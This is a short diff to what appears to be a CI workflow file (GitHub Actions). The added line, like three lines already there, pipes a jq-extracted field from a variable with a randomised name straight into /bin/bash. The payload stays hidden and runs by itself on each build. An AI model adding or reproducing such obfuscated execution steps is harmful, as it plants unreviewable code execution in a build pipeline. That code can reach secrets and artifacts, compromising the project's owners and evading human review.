@@ -23,6 +23,7 @@ jobs:
           echo $pbte38719 | jq -r .iivkz581 | /bin/bash
           printf '%s' "$re149" | jq -r .b5044 | /bin/bash
           echo $tft5 | jq -r .exkc6881 | /bin/bash
+          printf '%s' "$oxb6684" | jq -r .epobq33 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
